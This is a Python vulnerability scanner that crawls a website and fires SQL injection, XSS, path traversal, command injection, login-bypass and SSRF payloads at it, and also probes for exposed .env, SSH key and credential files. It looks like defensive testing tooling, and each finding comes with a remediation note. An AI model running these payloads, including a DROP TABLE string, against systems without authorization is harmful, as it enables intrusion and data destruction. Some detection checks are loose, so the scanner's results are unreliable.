#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Obscura Security Hunter - DEEP SCANNER ENGINE
Real, thorough, no-hallucination vulnerability detection

This scanner ACTUALLY tests the target, not just checks headers.
Estimated time: 2-5 minutes per target (thorough)
"""

import requests
import re
import json
import time
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse
from bs4 import BeautifulSoup
from datetime import datetime
import warnings
import threading
warnings.filterwarnings('ignore')

class DeepScanner:
    def __init__(self, target_url, scan_id=None, callback=None):
        self.target_url = target_url.rstrip('/')
        self.scan_id = scan_id
        self.parsed = urlparse(self.target_url)
        self.base_domain = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.callback = callback
        self.findings = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Crawling data
        self.discovered_urls = set()
        self.tested_urls = set()
        self.forms_found = []
        self.parameters_found = {}
        self.js_files = set()
        self.endpoints = set()
        
        # Statistics
        self.requests_made = 0
        self.start_time = None
        
    def log(self, phase, message):
        """Send progress update"""
        if self.callback:
            self.callback(phase, message)
        print(f"[{phase}] {message}")
    
    def add_finding(self, title, severity, description, evidence, recommendation, cwe=None):
        """Add finding with full details"""
        finding = {
            'title': title,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'recommendation': recommendation,
            'timestamp': datetime.now().isoformat(),
            'cwe': cwe
        }
        self.findings.append(finding)
        self.log("FINDING", f"[{severity}] {title}")
    
    def make_request(self, url, method='GET', data=None, headers=None, timeout=10):
        """Make HTTP request with tracking"""
        self.requests_made += 1
        try:
            if method == 'GET':
                return self.session.get(url, timeout=timeout, headers=headers or {})
            elif method == 'POST':
                return self.session.post(url, data=data, timeout=timeout, headers=headers or {})
            elif method == 'PUT':
                return self.session.put(url, data=data, timeout=timeout, headers=headers or {})
            elif method == 'DELETE':
                return self.session.delete(url, timeout=timeout, headers=headers or {})
            else:
                return self.session.request(method, url, timeout=timeout, headers=headers or {})
        except Exception as e:
            return None
    
    def crawl_website(self, max_depth=2, max_pages=50):
        """Deep crawl to discover all URLs, forms, and parameters"""
        self.log("Phase 1", "Starting deep crawl...")
        
        to_visit = [(self.target_url, 0)]
        visited = set()
        
        while to_visit and len(visited) < max_pages:
            url, depth = to_visit.pop(0)
            
            if url in visited or depth > max_depth:
                continue
            
            visited.add(url)
            self.discovered_urls.add(url)
            
            self.log("Phase 1", f"Crawling: {url} (depth: {depth})")
            
            resp = self.make_request(url)
            if not resp or resp.status_code != 200:
                continue
            
            # Parse HTML
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Extract all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    
                    # Only crawl same domain
                    if parsed.netloc == self.parsed.netloc:
                        if full_url not in visited:
                            to_visit.append((full_url, depth + 1))
                        
                        # Extract parameters
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            for param in params.keys():
                                if param not in self.parameters_found:
                                    self.parameters_found[param] = []
                                self.parameters_found[param].append(full_url)
                
                # Extract forms
                for form in soup.find_all('form'):
                    form_data = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        form_data['inputs'].append({
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', '')
                        })
                    
                    self.forms_found.append(form_data)
                
                # Extract JavaScript files
                for script in soup.find_all('script', src=True):
                    js_url = urljoin(url, script['src'])
                    self.js_files.add(js_url)
                
            except Exception as e:
                pass
            
            time.sleep(0.5)  # Be nice to the server
        
        self.log("Phase 1", f"Crawl complete. Found {len(self.discovered_urls)} URLs, {len(self.forms_found)} forms, {len(self.parameters_found)} parameters")
    
    def test_sql_injection_deep(self):
        """Deep SQL injection testing with multiple payloads"""
        self.log("Phase 2", "Testing SQL Injection (Deep)...")
        
        # SQL injection payloads (from real attack patterns)
        sql_payloads = [
            "'", '"', "1'", "1\"",
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "admin' --", "admin' #", "admin'/*",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1' AND '1'='2", "1' AND '1'='1",
            "'; DROP TABLE users--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5(1))--"
        ]
        
        # SQL error patterns (comprehensive)
        sql_errors = [
            r'sql syntax',
            r'mysql_fetch',
            r'mysqli::query',
            r'mysql_num_rows',
            r'pg_query',
            r'pg_exec',
            r'sqlite_',
            r'sqlite3_',
            r'odbc_exec',
            r'ora_',
            r'oci_',
            r'db2_',
            r'sybase',
            r'ingres_',
            r'sql server',
            r'microsoft ole db provider',
            r'unclosed quotation mark',
            r'quoted string not properly terminated',
            r'syntax error.*near',
            r'ora-\d{5}',
            r'warning.*mysql',
            r'valid mysql result',
            r'check the manual that corresponds to your.*server version',
        ]
        
        tested_count = 0
        
        # Test all discovered parameters
        for param_name, urls in self.parameters_found.items():
            for url in urls[:3]:  # Test first 3 URLs with this param
                for payload in sql_payloads:
                    tested_count += 1
                    
                    # Parse URL
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    
                    # Inject payload
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    resp = self.make_request(test_url)
                    if not resp:
                        continue
                    
                    # Check for SQL errors
                    content_lower = resp.text.lower()
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, content_lower, re.IGNORECASE):
                            self.add_finding(
                                f"SQL Injection in parameter: {param_name}",
                                "Critical",
                                f"Parameter '{param_name}' is vulnerable to SQL injection. Database errors leaked.",
                                f"URL: {test_url}\nPayload: {payload}\nError pattern found: {error_pattern}\nResponse length: {len(resp.text)}",
                                "Use parameterized queries (prepared statements). Never concatenate user input into SQL.",
                                cwe="CWE-89"
                            )
                            return  # Found one, stop testing this param
                    
                    time.sleep(0.2)
        
        self.log("Phase 2", f"SQL Injection test complete. Tested {tested_count} combinations")
    
    def test_xss_deep(self):
        """Deep XSS testing with real payloads"""
        self.log("Phase 3", "Testing Cross-Site Scripting (Deep)...")
        
        # XSS payloads (real world)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<img src=x:alert(1) onerror=eval(src)>',
            '<svg><script>alert(1)</script></svg>',
            '<math><mtext><script>alert(1)</script></mtext></math>'
        ]
        
        tested_count = 0
        
        # Test GET parameters
        for param_name, urls in self.parameters_found.items():
            for url in urls[:2]:
                for payload in xss_payloads[:5]:  # Test first 5 payloads
                    tested_count += 1
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    resp = self.make_request(test_url)
                    if not resp:
                        continue
                    
                    # Check if payload reflected
                    if payload in resp.text:
                        # Verify it's not encoded
                        if '<script' in resp.text or 'onerror=' in resp.text or 'onload=' in resp.text:
                            self.add_finding(
                                f"Reflected XSS in parameter: {param_name}",
                                "High",
                                f"Parameter '{param_name}' reflects user input without sanitization, enabling XSS attacks.",
                                f"URL: {test_url}\nPayload: {payload}\nPayload found in response unescaped",
                                "Implement output encoding (HTML entity encoding). Use Content-Security-Policy header.",
                                cwe="CWE-79"
                            )
                            break
                    
                    time.sleep(0.2)
        
        # Test forms
        for form in self.forms_found[:5]:  # Test first 5 forms
            for payload in xss_payloads[:3]:
                tested_count += 1
                
                # Prepare form data
                form_data = {}
                for input_field in form['inputs']:
                    if input_field['name']:
                        form_data[input_field['name']] = payload
                
                if form['method'] == 'POST':
                    resp = self.make_request(form['action'], method='POST', data=form_data)
                else:
                    resp = self.make_request(form['action'], method='GET', data=form_data)
                
                if resp and payload in resp.text:
                    if '<script' in resp.text or 'onerror=' in resp.text:
                        self.add_finding(
                            f"Reflected XSS in form: {form['action']}",
                            "High",
                            "Form does not sanitize user input, enabling XSS attacks.",
                            f"Form action: {form['action']}\nMethod: {form['method']}\nPayload: {payload}",
                            "Implement output encoding and input validation.",
                            cwe="CWE-79"
                        )
                        break
                
                time.sleep(0.2)
        
        self.log("Phase 3", f"XSS test complete. Tested {tested_count} combinations")
    
    def test_path_traversal_deep(self):
        """Deep path traversal / LFI testing"""
        self.log("Phase 4", "Testing Path Traversal / LFI (Deep)...")
        
        # Path traversal payloads
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%5c..%5c..%5cwindows%5cwin.ini',
            '/etc/passwd',
            'C:\\windows\\win.ini',
            '....//....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....\\\\....\\\\....\\\\windows\\\\win.ini'
        ]
        
        # Success markers
        unix_markers = ['root:x:', 'daemon:', 'bin:', 'sys:', 'nobody:']
        windows_markers = ['[fonts]', '[extensions]', 'for 16-bit app']
        
        tested_count = 0
        
        # Test file parameters
        file_params = [p for p in self.parameters_found.keys() if any(x in p.lower() for x in ['file', 'path', 'page', 'document', 'include', 'dir', 'folder'])]
        
        for param_name in file_params:
            urls = self.parameters_found[param_name]
            for url in urls[:2]:
                for payload in lfi_payloads:
                    tested_count += 1
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    resp = self.make_request(test_url)
                    if not resp:
                        continue
                    
                    content_lower = resp.text.lower()
                    
                    # Check for Unix markers
                    if any(marker in content_lower for marker in unix_markers):
                        self.add_finding(
                            f"Path Traversal / LFI in parameter: {param_name}",
                            "Critical",
                            f"Parameter '{param_name}' allows reading arbitrary files from the server filesystem.",
                            f"URL: {test_url}\nPayload: {payload}\nFile content found: /etc/passwd\nResponse length: {len(resp.text)}",
                            "Never trust user input for file paths. Use whitelist of allowed files only.",
                            cwe="CWE-22"
                        )
                        return
                    
                    # Check for Windows markers
                    if any(marker in content_lower for marker in windows_markers):
                        self.add_finding(
                            f"Path Traversal / LFI in parameter: {param_name}",
                            "Critical",
                            f"Parameter '{param_name}' allows reading arbitrary files from the server filesystem.",
                            f"URL: {test_url}\nPayload: {payload}\nFile content found: win.ini\nResponse length: {len(resp.text)}",
                            "Never trust user input for file paths. Use whitelist of allowed files only.",
                            cwe="CWE-22"
                        )
                        return
                    
                    time.sleep(0.2)
        
        self.log("Phase 4", f"Path Traversal test complete. Tested {tested_count} combinations")
    
    def test_command_injection(self):
        """Test for OS command injection"""
        self.log("Phase 5", "Testing Command Injection...")
        
        # Command injection payloads
        cmd_payloads = [
            '; ls',
            '| ls',
            '& ls',
            '; dir',
            '| dir',
            '&& dir',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; whoami',
            '| whoami',
            '`whoami`',
            '$(whoami)',
            '; sleep 5',
            '| sleep 5'
        ]
        
        # Command output markers
        cmd_markers = [
            r'total \d+',  # ls output
            r'directory of',  # dir output
            r'root:',  # passwd output
            r'volume in drive',  # Windows dir
            r'bin',  # Unix directories
            r'uid=\d+',  # whoami output
        ]
        
        tested_count = 0
        
        for param_name, urls in self.parameters_found.items():
            for url in urls[:1]:
                for payload in cmd_payloads[:5]:
                    tested_count += 1
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    start_time = time.time()
                    resp = self.make_request(test_url, timeout=15)
                    elapsed = time.time() - start_time
                    
                    if not resp:
                        continue
                    
                    # Check for command output
                    for marker in cmd_markers:
                        if re.search(marker, resp.text, re.IGNORECASE):
                            self.add_finding(
                                f"Command Injection in parameter: {param_name}",
                                "Critical",
                                f"Parameter '{param_name}' allows execution of arbitrary OS commands.",
                                f"URL: {test_url}\nPayload: {payload}\nCommand output detected in response",
                                "Never pass user input to system commands. Use safe APIs instead.",
                                cwe="CWE-78"
                            )
                            return
                    
                    # Time-based detection (sleep command)
                    if 'sleep' in payload and elapsed > 4:
                        self.add_finding(
                            f"Blind Command Injection in parameter: {param_name}",
                            "Critical",
                            f"Parameter '{param_name}' appears vulnerable to blind command injection (time-based).",
                            f"URL: {test_url}\nPayload: {payload}\nResponse time: {elapsed:.2f}s (expected >5s)",
                            "Never pass user input to system commands.",
                            cwe="CWE-78"
                        )
                        return
                    
                    time.sleep(0.2)
        
        self.log("Phase 5", f"Command Injection test complete. Tested {tested_count} combinations")
    
    def test_authentication_bypass(self):
        """Test for authentication bypass"""
        self.log("Phase 6", "Testing Authentication Bypass...")
        
        # Auth bypass payloads
        auth_payloads = {
            'username': ["admin' OR '1'='1", "admin' --", "admin' #", "' OR '1'='1' --"],
            'password': ["password", "' OR '1'='1", "admin"],
            'email': ["admin@example.com' OR '1'='1 --"]
        }
        
        # Test login forms
        for form in self.forms_found:
            # Check if it's a login form
            input_names = [inp['name'].lower() for inp in form['inputs'] if inp['name']]
            
            is_login = any(name in input_names for name in ['username', 'user', 'email', 'login']) and \
                      any(name in input_names for name in ['password', 'pass', 'pwd'])
            
            if not is_login:
                continue
            
            self.log("Phase 6", f"Testing login form: {form['action']}")
            
            # Try bypass payloads
            for payload_user in auth_payloads['username'][:3]:
                form_data = {}
                for inp in form['inputs']:
                    name = inp['name']
                    if not name:
                        continue
                    
                    name_lower = name.lower()
                    if any(x in name_lower for x in ['user', 'email', 'login']):
                        form_data[name] = payload_user
                    elif any(x in name_lower for x in ['pass', 'pwd']):
                        form_data[name] = 'anything'
                    else:
                        form_data[name] = inp.get('value', '')
                
                if form['method'] == 'POST':
                    resp = self.make_request(form['action'], method='POST', data=form_data)
                else:
                    resp = self.make_request(form['action'], method='GET', data=form_data)
                
                if resp:
                    # Check for successful bypass indicators
                    indicators = ['welcome', 'dashboard', 'logout', 'profile', 'settings']
                    content_lower = resp.text.lower()
                    
                    if any(ind in content_lower for ind in indicators):
                        self.add_finding(
                            "Authentication Bypass Vulnerability",
                            "Critical",
                            "Login form may be vulnerable to SQL injection authentication bypass.",
                            f"Form: {form['action']}\nPayload: {payload_user}\nResponse contains: {[ind for ind in indicators if ind in content_lower]}",
                            "Use prepared statements. Implement proper authentication checks.",
                            cwe="CWE-287"
                        )
                        return
                
                time.sleep(0.3)
        
        self.log("Phase 6", "Authentication Bypass test complete")
    
    def test_ssrf(self):
        """Test for SSRF vulnerabilities"""
        self.log("Phase 7", "Testing SSRF...")
        
        # SSRF payloads
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254',  # AWS metadata
            'http://[::1]',
            'http://0.0.0.0',
            'file:///etc/passwd',
            'dict://127.0.0.1:11211'
        ]
        
        # URL/URI parameters
        url_params = [p for p in self.parameters_found.keys() if any(x in p.lower() for x in ['url', 'uri', 'link', 'redirect', 'target', 'dest', 'site'])]
        
        for param_name in url_params:
            urls = self.parameters_found[param_name]
            for url in urls[:1]:
                for payload in ssrf_payloads[:3]:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    resp = self.make_request(test_url)
                    if resp:
                        content_lower = resp.text.lower()
                        
                        # Check for internal service responses
                        if 'localhost' in content_lower or '127.0.0.1' in content_lower:
                            self.add_finding(
                                f"Possible SSRF in parameter: {param_name}",
                                "High",
                                "Parameter may allow Server-Side Request Forgery to internal resources.",
                                f"URL: {test_url}\nPayload: {payload}\nInternal service indicators found",
                                "Validate and whitelist allowed URLs. Block internal IP ranges.",
                                cwe="CWE-918"
                            )
                            return
                    
                    time.sleep(0.2)
        
        self.log("Phase 7", "SSRF test complete")
    
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        self.log("Phase 8", "Testing Sensitive Data Exposure...")
        
        # Sensitive files/directories
        sensitive_paths = [
            '/.env', '/.git/config', '/.git/HEAD', '/.gitignore',
            '/config.php', '/wp-config.php', '/.aws/credentials',
            '/id_rsa', '/.ssh/id_rsa', '/.ssh/authorized_keys',
            '/.htaccess', '/.htpasswd', '/web.config',
            '/composer.json', '/package.json', '/yarn.lock',
            '/phpinfo.php', '/info.php', '/test.php',
            '/.DS_Store', '/Thumbs.db', '/.svn/entries',
            '/backup.sql', '/database.sql', '/dump.sql',
            '/.env.backup', '/.env.old', '/.env.dev',
            '/wp-content/debug.log', '/error_log', '/error.log'
        ]
        
        found_count = 0
        
        for path in sensitive_paths:
            test_url = urljoin(self.base_domain, path)
            resp = self.make_request(test_url)
            
            if resp and resp.status_code == 200 and len(resp.content) > 10:
                content_lower = resp.text.lower()
                
                # Verify it's actually sensitive content
                sensitive_indicators = {
                    '.env': ['password', 'secret', 'key', 'token', 'api'],
                    '.git': ['[core]', 'repository', 'ref:'],
                    'config': ['password', 'database', 'host', 'user'],
                    'ssh': ['private key', 'rsa', 'dsa', 'ssh-'],
                    'sql': ['insert into', 'create table', 'drop table'],
                    'phpinfo': ['php version', 'system', 'loaded modules'],
                    'log': ['error', 'warning', 'exception', 'stack trace']
                }
                
                for key, indicators in sensitive_indicators.items():
                    if key in path.lower():
                        if any(ind in content_lower for ind in indicators):
                            self.add_finding(
                                f"Sensitive File Exposed: {path}",
                                "Critical" if key in ['.env', 'ssh', 'sql', 'config'] else "High",
                                f"Sensitive file is publicly accessible: {path}",
                                f"URL: {test_url}\nFile size: {len(resp.content)} bytes\nContent preview: {resp.text[:100]}",
                                f"Remove {path} from web root or restrict access with proper permissions.",
                                cwe="CWE-200"
                            )
                            found_count += 1
                            break
            
            time.sleep(0.1)
        
        self.log("Phase 8", f"Sensitive Data Exposure test complete. Found {found_count} exposed files")
    
    def test_security_headers(self):
        """Test security headers"""
        self.log("Phase 9", "Analyzing Security Headers...")
        
        resp = self.make_request(self.target_url)
        if not resp:
            return
        
        # Check critical security headers
        headers_to_check = {
            'Strict-Transport-Security': {
                'severity': 'High',
                'description': 'Missing HSTS header - site does not enforce HTTPS',
                'recommendation': 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'
            },
            'Content-Security-Policy': {
                'severity': 'High',
                'description': 'Missing CSP header - site vulnerable to XSS and data injection attacks',
                'recommendation': "Add Content-Security-Policy with appropriate directives"
            },
            'X-Frame-Options': {
                'severity': 'Medium',
                'description': 'Missing X-Frame-Options - site vulnerable to clickjacking',
                'recommendation': 'Add: X-Frame-Options: SAMEORIGIN or DENY'
            },
            'X-Content-Type-Options': {
                'severity': 'Low',
                'description': 'Missing X-Content-Type-Options - browser may MIME-sniff responses',
                'recommendation': 'Add: X-Content-Type-Options: nosniff'
            },
            'Referrer-Policy': {
                'severity': 'Low',
                'description': 'Missing Referrer-Policy - referrer information may leak',
                'recommendation': 'Add: Referrer-Policy: no-referrer-when-downgrade'
            },
            'Permissions-Policy': {
                'severity': 'Low',
                'description': 'Missing Permissions-Policy - browser features not restricted',
                'recommendation': 'Add Permissions-Policy to restrict browser features'
            }
        }
        
        for header, info in headers_to_check.items():
            if header not in resp.headers:
                self.add_finding(
                    f"Missing Security Header: {header}",
                    info['severity'],
                    info['description'],
                    f"Header '{header}' not present in response",
                    info['recommendation'],
                    cwe="CWE-693"
                )
    
    def run_deep_scan(self):
        """Execute complete deep scan"""
        self.start_time = time.time()
        
        try:
            # Phase 1: Crawl and discover
            self.crawl_website(max_depth=2, max_pages=30)
            
            # Phase 2: SQL Injection (Deep)
            self.test_sql_injection_deep()
            
            # Phase 3: XSS (Deep)
            self.test_xss_deep()
            
            # Phase 4: Path Traversal / LFI
            self.test_path_traversal_deep()
            
            # Phase 5: Command Injection
            self.test_command_injection()
            
            # Phase 6: Authentication Bypass
            self.test_authentication_bypass()
            
            # Phase 7: SSRF
            self.test_ssrf()
            
            # Phase 8: Sensitive Data Exposure
            self.test_sensitive_data_exposure()
            
            # Phase 9: Security Headers
            self.test_security_headers()
            
            # Final statistics
            elapsed = time.time() - self.start_time
            self.log("Complete", f"Scan finished in {elapsed:.1f}s. Made {self.requests_made} requests. Found {len(self.findings)} issues.")
            
        except Exception as e:
            self.log("ERROR", f"Scan error: {str(e)}")
        
        return {
            'findings': self.findings,
            'statistics': {
                'duration': time.time() - self.start_time if self.start_time else 0,
                'requests': self.requests_made,
                'urls_discovered': len(self.discovered_urls),
                'forms_found': len(self.forms_found),
                'parameters_found': len(self.parameters_found)
            }
        }
